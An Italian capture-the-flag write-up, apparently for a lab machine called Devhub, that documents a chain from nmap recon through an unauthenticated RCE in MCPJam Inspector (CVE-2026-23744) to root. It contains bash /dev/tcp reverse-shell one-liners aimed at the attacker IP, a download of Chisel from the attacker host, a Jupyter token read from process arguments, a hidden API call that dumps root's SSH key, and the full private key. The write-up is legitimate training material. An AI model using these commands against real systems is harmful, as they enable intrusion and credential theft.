# Macchina Devhub
IP vittima: 10.129.36.224 
IP attaccante: 10.10.14.241
# 1. Reconnaissance

## 1.1 Scansione di tutte le porte

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.36.224 -oG porte
```

Risultato:

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6274/tcp open  unknown syn-ack ttl 63
```

Abbiamo quindi solamente tre porte TCP interessanti.
## 1.2 Enumerazione dei servizi

```
sudo nmap -sC -sV -O -p22,80,6274 10.129.36.224 -oN servizi
```

Risultato:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 26 Jul 2026 20:10:42 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
...
```

I risultati principali sono:

```
22/tcp   OpenSSH 8.9p1 Ubuntu
80/tcp   nginx 1.18.0
6274/tcp HTTP - MCPJam Inspector
```

La porta 80 effettua inoltre un redirect verso:

```
http://devhub.htb/
```

Aggiungiamo quindi il dominio a `/etc/hosts`:

```
sudo sh -c 'echo "10.129.36.224 devhub.htb" >> /etc/hosts'
```
# 2. Enumerazione della porta 80

Analizziamo la pagina:

```
curl http://devhub.htb/
```

Il sito è sostanzialmente una pagina statica, ma contiene informazioni molto interessanti:

```
DevHub - Internal Development & Analytics Platform
```

Sono elencati tre servizi:

```
MCP Inspector
Active - Port 6274

Analytics Dashboard
Jupyter-based analytics environment
Internal Only - localhost:8888

Code Repository
Maintenance Mode
```

Questa pagina ci fornisce quindi un'informazione fondamentale:

```
Jupyter → 127.0.0.1:8888
```

Il servizio non è raggiungibile direttamente dall'esterno, ma ricordiamocelo per dopo.
# 3. Enumerazione della porta 6274

Richiedendo la pagina:

```
curl http://10.129.36.224:6274/
```

otteniamo:

```
...
<title>MCPJam Inspector</title>
...
```

Aprendo l'interfaccia nel browser con

`http://10.129.36.224:6274/`

Entriamo nella dashboard di MCPJam. In `settings` possiamo identificare la versione:

```
MCPJam Inspector 1.4.2
```

Questa versione è vulnerabile a **CVE-2026-23744**.

La vulnerabilità interessa MCPJam Inspector fino alla versione 1.4.2 inclusa e consente Remote Code Execution senza autenticazione; la versione 1.4.3 contiene la correzione. Il CVSS 3.1 assegnato è 9.8.
# 4. Foothold tramite CVE-2026-23744

Il **CVE-2026-23744** è una vulnerabilità di **Remote Code Execution senza autenticazione** in **MCPJam Inspector ≤ 1.4.2**.
## 4.1 A cosa serve normalmente MCPJam

MCPJam Inspector è uno strumento per sviluppare e testare server **MCP**.

Un server MCP può essere avviato localmente tramite `stdio`. Per esempio, concettualmente MCPJam deve poter fare qualcosa del genere:

```
programma: python3
argomenti: ["server.py"]
```

oppure:

```
programma: node
argomenti: ["mcp-server.js"]
```

Quindi MCPJam **deve avere legittimamente la capacità di creare processi sul sistema operativo**.

Ed è proprio qui che nasce il problema.
## 4.2 L'endpoint vulnerabile

MCPJam espone:

```
POST /api/mcp/connect
```

L'endpoint accetta una configurazione contenente campi come:

```
{
  "serverConfig": {
    "command": "...",
    "args": [...]
  }
}
```

L'intenzione è permettere all'Inspector di dire:

> “Per collegarmi a questo MCP server, avvia questo programma con questi argomenti.”

Il problema è che nelle versioni vulnerabili **non viene verificato che chi effettua la richiesta sia autorizzato**. L'advisory ufficiale specifica che `/api/mcp/connect` estraeva `command` e `args` dalla richiesta senza controlli di sicurezza, permettendo l'esecuzione arbitraria.
## 4.3 Perché diventa una RCE

Immagina una richiesta legittima:

```
"command": "python3",
"args": ["server.py"]
```

MCPJam deve eseguire:

```
python3 server.py
```

Ma se posso scegliere io liberamente `command` e `args`, posso mandare:

```
"command": "bash",
"args": ["-c", "id"]
```

che equivale a:

```
bash -c 'id'
```

A quel punto non sto più chiedendo a MCPJam di eseguire un server MCP: lo sto usando come **process launcher remoto**.

L'endpoint vulnerabile è dunque:

```
/api/mcp/connect
```

Apriamo un listener:

```
nc -lvnp 4444
```
# 5. Reverse shell come mcp-dev
## 5.1 Exploit manuale

Utilizziamo l'endpoint per avviare una reverse shell:

```
curl -X POST http://10.129.36.224:6274/api/mcp/connect \
-H 'Content-Type: application/json' \
-d '{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.241/4444 0>&1"],
    "env": {}
  },
  "serverId": "shell"
}'
```

Otteniamo:

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Verifichiamo:

```
whoami
id
pwd
```

Output:

```
mcp-dev

uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

/opt/mcpjam/node_modules/@mcpjam/inspector
```

Abbiamo quindi il primo foothold con l'utente:

```
mcp-dev
```
## 5.2 Exploit POC

Lo stesso risultato lo si può ottenere con questo exploit:
https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC
# 6. Enumerazione interna

Dalla pagina sulla porta 80 sappiamo già dell'esistenza di Jupyter su:

```
127.0.0.1:8888
```

Verifichiamo:

```
ss -lntp | grep 8888
```

Output:

```
LISTEN 0      128        127.0.0.1:8888      0.0.0.0:* 
```

Interroghiamo il servizio:

```
curl -i http://127.0.0.1:8888/
```

Otteniamo:

```
...
HTTP/1.1 302 Found
Server: TornadoServer/6.5.4
Content-Type: text/html; charset=UTF-8
Date: Sun, 26 Jul 2026 20:39:01 GMT
Location: /lab?
Content-Length:
```

Quindi Jupyter è effettivamente attivo.

Provando:

```
curl -i http://127.0.0.1:8888/lab
```

otteniamo:

```
...
Location: /login?next=%2Flab
...
```

È quindi necessario autenticarsi.
# 7. Recupero del token Jupyter

Controlliamo i processi:

```
ps auxww | grep -i '[j]upyter'
```

Compare:

```
...
analyst      995  0.1  2.4 182528 96208 ?        Ss   20:07   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
...
root 1024 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
...
```

Questo risultato ci fornisce due informazioni fondamentali.

Jupyter gira come:

```
analyst
```

e il token è direttamente visibile nella command line:

```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Quindi la lateral escalation non sfrutta un CVE specifico.

Il problema è semplicemente:

```
token sensibile nei parametri del processo
        ↓
leggibile tramite ps
        ↓
accesso autenticato a Jupyter
```

Inoltre abbiamo trovato anche:

```
root 1024 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Un secondo processo particolarmente interessante eseguito come `root`. Per il momento ci concentriamo su Jupyter per ottenere l'accesso come `analyst`, ma teniamo a mente `/opt/opsmcp/server.py` come possibile vettore per la successiva privilege escalation.
# 8. Verifica del token

Possiamo controllare che il token funzioni:

```
curl -s \
-H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
http://127.0.0.1:8888/api/contents \
| python3 -m json.tool
```

Viene mostrato:

```
{
    "name": "",
    "path": "",
    "last_modified": "2026-05-26T08:42:22.462480Z",
    "created": "2026-05-26T08:42:22.462480Z",
    "content": [
        {
            "name": "quarterly_analysis.ipynb",
            "path": "quarterly_analysis.ipynb",
...
```

Il notebook si trova quindi in:

```
/home/analyst/notebooks/quarterly_analysis.ipynb
```

ed è scrivibile.
# 9. Tunnel con Chisel

Sulla nostra Parrot abbiamo [[Chisel]]mentre non è presente sulla macchina target:
## 9.1 Trasferimento di Chisel

Sulla Parrot:

```
cp /usr/bin/chisel /tmp/chisel
cd /tmp
python3 -m http.server 8000
```

Dal target:

```
curl http://10.10.14.241:8000/chisel -o /tmp/chisel
chmod +x /tmp/chisel
```
## 9.2 Creazione del reverse tunnel

Sulla Parrot:

```
chisel server --reverse --port 9001
```

Sul target:

```
/tmp/chisel client 10.10.14.241:9001 R:8888:127.0.0.1:8888
```

Adesso la porta:

```
127.0.0.1:8888
```

della nostra Parrot viene inoltrata verso:

```
127.0.0.1:8888
```

del target.
# 10. Accesso a JupyterLab

Apriamo nel browser della nostra macchina:

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Entriamo direttamente in JupyterLab.

Nel file browser (icona a forma di cartella nella barra di sinistra) troviamo:

```
quarterly_analysis.ipynb
```

Facciamo doppio clic sul notebook.
# 11. Verifica dell'esecuzione come analyst

Creiamo una nuova Code Cell (cliccare su **Click to add a cell** sotto la cella già presente):

```
import os
print(os.getuid())
print(os.getenv("USER"))
print(os.getcwd())
```

Premiamo:

```
Shift + Enter
```

Otteniamo:

```
1002
analyst
/home/analyst/notebooks
```

Questo dimostra che il kernel Jupyter esegue codice come:

```
analyst
```
# 12. Reverse shell come analyst - User flag

Sulla Parrot apriamo un nuovo listener:

```
nc -lvnp 4445
```

Nel notebook inseriamo una nuova cella:

```
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.241/4445 0>&1'")
```

Eseguiamo con:

```
Shift + Enter
```

Sul listener otteniamo:

```
analyst@devhub:~/notebooks$
```

Verifichiamo:

```
whoami
id
pwd
```

Output:

```
analyst

uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)

/home/analyst/notebooks
```

Abbiamo quindi completato:

```
mcp-dev → analyst
```

Possiamo recuperare la user flag:

```
cat /home/analyst/user.txt
```
# 13. Privilege Escalation

Durante l'enumerazione dei processi avevamo già notato qualcosa di molto interessante:

```
root ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Quindi esiste un'applicazione Python:

```
/opt/opsmcp/server.py
```

eseguita come:

```
root
```

Controlliamo i permessi:

```
ls -la /opt/opsmcp
```

Output:

```
-rw-r----- analyst analyst server.py
```

L'utente `analyst` può quindi leggere il sorgente.
# 14. Analisi di server.py

Leggiamo:

```
sed -n '1,240p' /opt/opsmcp/server.py
```

Troviamo un'app Flask che ascolta su:

```
app.run(
    host='127.0.0.1',
    port=5000,
    debug=False
)
```

e soprattutto una API key hardcoded:

```
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Sono definiti alcuni tool visibili:

```
ops.system_status
ops.list_services
ops.check_disk
ops.view_logs
```

ma soprattutto due tool nascosti:

```
HIDDEN_TOOLS = {
    "ops._admin_dump": {...},
    "ops._debug_mode": {...}
}
```

Il più interessante è:

```
ops._admin_dump
```
# 15. Funzione nascosta `ops._admin_dump`

Analizzando il codice troviamo (sempre contenuto in server.py):

```
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
```

Questa funzione viene eseguita dal processo OPSMCP, che gira come:

```
root
```

Quindi può leggere:

```
/root/.ssh/id_rsa
```

La funzione restituisce poi il contenuto della chiave attraverso l'API.

Questo è il vettore di privilege escalation.
# 16. Richiesta della chiave privata di root

Utilizziamo l'API key trovata nel sorgente e chiamiamo direttamente il tool nascosto:

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
-H 'Content-Type: application/json' \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

La risposta contiene:

```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

Abbiamo quindi ottenuto:

```
/root/.ssh/id_rsa
```

senza avere ancora privilegi root.
# 17. Salvataggio della chiave

Utilizziamo Python per estrarre il valore JSON.

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
-H 'Content-Type: application/json' \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' \
> /tmp/root_id_rsa
```

Impostiamo i permessi corretti:

```
chmod 600 /tmp/root_id_rsa
```
# 18. Accesso SSH come root

Possiamo utilizzare la chiave direttamente contro il server SSH locale:

```
ssh \
-o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-i /tmp/root_id_rsa \
root@127.0.0.1
```

Dopo aver sistemato la shell con `python3 -c 'import pty; pty.spawn("/bin/bash")'` otteniamo:

```
root@devhub:~#
```

Verifichiamo:

```
whoami
id
```

Output:

```
root
uid=0(root) gid=0(root) groups=0(root)
```

Infine:

```
cat /root/root.txt
```

e otteniamo la root flag.
